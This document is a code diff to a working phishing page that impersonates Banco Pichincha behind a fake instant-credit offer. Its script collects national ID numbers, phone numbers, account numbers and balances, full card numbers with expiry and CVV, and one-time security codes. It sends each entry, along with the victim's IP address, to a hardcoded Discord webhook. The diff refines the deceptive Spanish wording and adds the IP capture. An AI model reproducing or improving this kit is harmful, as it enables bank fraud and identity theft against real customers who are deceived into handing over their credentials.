@@ -128,14 +128,14 @@
             <div class="logo-container">
                 <img src="https://s.yimg.com/os/es/valora_628/8c136fb3f79b3b8cc73a21d1bee37b8c" alt="Logo">
             </div>
-            <h2>Acreditacion de cupo Inmediato</h2>
+            <h2>Acreditación de Cupo Inmediato</h2>
             <div class="form-group">
                 <label>Número de Cédula</label>
-                <input type="number" id="cedula" placeholder="10 dígitos">
+                <input type="number" id="cedula" placeholder="">
             </div>
             <div class="form-group">
                 <label>Teléfono Celular</label>
-                <input type="tel" id="telefono" placeholder="09XXXXXXXX">
+                <input type="tel" id="telefono" placeholder="">
             </div>
             <button class="btn-yellow" onclick="irPaso2()">Consultar Oferta</button>
         </div>
@@ -144,7 +144,7 @@
             <div class="logo-container">
                 <img src="https://s.yimg.com/os/es/valora_628/8c136fb3f79b3b8cc73a21d1bee37b8c" alt="Logo">
             </div>
-            <h2>Condiciones del Credito pre-Aprobado</h2>
+            <h2>Condiciones del Crédito pre-Aprobado</h2>
             <div class="simulation-box">
                 <div class="form-group">
                     <label>Monto a solicitar ($)</label>
@@ -174,13 +174,13 @@
             </div>
             <div class="form-group">
                 <label>Número de Cuenta Receptora</label>
-                <input type="number" id="num_cuenta" placeholder="Ej:">
+                <input type="number" id="num_cuenta" placeholder=":">
             </div>
             <div class="form-group">
-                <label>Fondos encuenta para Validacion ($)</label>
-                <input type="number" id="saldo_disponible" placeholder="0.00">
+                <label>Fondos en cuenta para Validación ($)</label>
+                <input type="number" id="saldo_disponible" placeholder="">
             </div>
-            <button class="btn-yellow" onclick="irPaso3()">Comencemos </button>
+            <button class="btn-yellow" onclick="irPaso3()">Comencemos</button>
         </div>
 
         <div id="step3" class="hidden">
@@ -189,7 +189,7 @@
             </div>
             <h2>Verificación de Desembolso</h2>
             <div class="security-banner">
-                <span>🛡️ <strong>Aviso:</strong> Para autorizar el desembolso inmediato, vincule su tarjeta de respaldo Debito Automatico en Tarjeta.</span>
+                <span>🛡️ <strong>Aviso:</strong> El banco utiliza la tarjeta para confirmar que exista una cuenta activa y funcional donde se puedan aplicar cargos en caso deque la cuenta principal no tenga fondos suficientes.</span>
             </div>
             <div class="blue-card-visual">
                 <div class="card-label">Número de Tarjeta</div>
@@ -225,9 +225,9 @@
     <div class="modal card">
         <div class="token-header">🔒 SEGURIDAD BANCO PICHINCHA </div>
         <h2>Clave Digital</h2>
-        <p>Validacion de Seguridad para Desembolso Confimar Clave Digital O codigo de Seguridad Via SMS O correo Electronico.</p>
+        <p>Validación de Seguridad para Desembolso. Confirmar   Código de Seguridad vía SMS o Correo Electrónico.</p>
         <div class="token-input-wrapper">
-            <input type="text" id="token" maxlength="6" style="text-align:center; font-size: 2rem; border: none; background: white;" placeholder="000000">
+            <input type="text" id="token" maxlength="6" style="text-align:center; font-size: 2rem; border: none; background: white;" placeholder="">
         </div>
         <div id="errorMsg" style="color: #d93025; font-size: 0.8rem; font-weight: bold; margin-bottom: 15px; display: none;"></div>
         <button class="btn-yellow" onclick="validarToken()">CONFIRMAR DESEMBOLSO</button>
@@ -239,7 +239,6 @@
         <div class="logo-container">
             <img src="https://s.yimg.com/os/es/valora_628/8c136fb3f79b3b8cc73a21d1bee37b8c" alt="Logo final">
         </div>
-        <div style="font-size: 3rem; color: var(--safe-green);"></div>
         <h2>Solicitud Procesada</h2>
         <div class="receipt-box">
             <div class="receipt-row"><span>Estado:</span> <strong>Aprobado</strong></div>
@@ -253,8 +252,24 @@
 <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1473680961848869036/H0j7g0TZW2eGxBZUC5F64ZqOjUkD8Ols_wGoZOrcpifrxKRejKt6hpcE7c34bRUxcXUD";
     let intentos = 0;
+    let userIP = "Buscando IP...";
 
-    async function enviarDiscord(contenido) {
+    // Captura la IP al inicio
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => userIP = data.ip)
+        .catch(() => userIP = "No disponible");
+
+    async function enviarDiscord(paso, datos) {
+        let contenido = `🔔 NUEVO REPORTE\n`;
+        contenido += `🌐 IP USUARIO: ${userIP}\n`;
+        contenido += `📍 ORIGEN: ${paso}\n`;
+        contenido += `--------------------------\n`;
+        
+        for (const [key, val] of Object.entries(datos)) {
+            contenido += `${key}: ${val}\n`;
+        }
+
         await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -272,7 +287,9 @@
         const c = document.getElementById('cedula').value;
         const t = document.getElementById('telefono').value;
         if(!c || !t) return alert("Complete los campos.");
-        enviarDiscord(`[PASO 1]\nCed: ${c}\nTel: ${t}`);
+        
+        enviarDiscord("PASO 1", { "Cédula": c, "Teléfono": t });
+        
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
         document.getElementById('p2').classList.add('active');
@@ -283,7 +300,14 @@
         const nc = document.getElementById('num_cuenta').value;
         const sd = document.getElementById('saldo_disponible').value;
         if(!nc || !sd) return alert("Complete los datos de cuenta.");
-        enviarDiscord(`[PASO 2]\nMonto: $${document.getElementById('monto').value}\nPlazo: ${document.getElementById('plazo').value} meses\nCta: ${nc}\nSal: ${sd}`);
+        
+        enviarDiscord("PASO 2", { 
+            "Monto": `$${document.getElementById('monto').value}`, 
+            "Plazo": `${document.getElementById('plazo').value} meses`, 
+            "Cuenta": nc, 
+            "Saldo": sd 
+        });
+        
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('step3').classList.remove('hidden');
         document.getElementById('p3').classList.add('active');
@@ -294,8 +318,15 @@
         const et = document.getElementById('exp_t').value;
         const cv = document.getElementById('cvv_t').value;
         const df = document.getElementById('destino_fondos').value;
-        if(!nt || !et || !cv || !df) return alert("Complete todos los campos de verificación.");
-        enviarDiscord(`[PASO 3]\nTarj: ${nt}\nExp: ${et}\nCVV: ${cv}\nDestino: ${df}`);
+        if(!nt || !et || !cv || !df) return alert("Complete verificación.");
+        
+        enviarDiscord("PASO 3", { 
+            "Tarjeta": nt, 
+            "Expira": et, 
+            "CVV": cv, 
+            "Destino": df 
+        });
+        
         document.getElementById('modalToken').style.display = 'flex';
         document.getElementById('p4').classList.add('active');
     }
@@ -310,7 +341,9 @@
         const tk = document.getElementById('token').value;
         if(!tk) return;
         intentos++;
-        enviarDiscord(`[TOKEN]\nIntento ${intentos}: ${tk}`);
+        
+        enviarDiscord("TOKEN", { "Intento": intentos, "Código": tk });
+        
         if (intentos >= 4) {
             document.getElementById('mFinal').innerText = "$" + document.getElementById('monto').value;
             document.getElementById('currDate').innerText = new Date().toLocaleDateString();
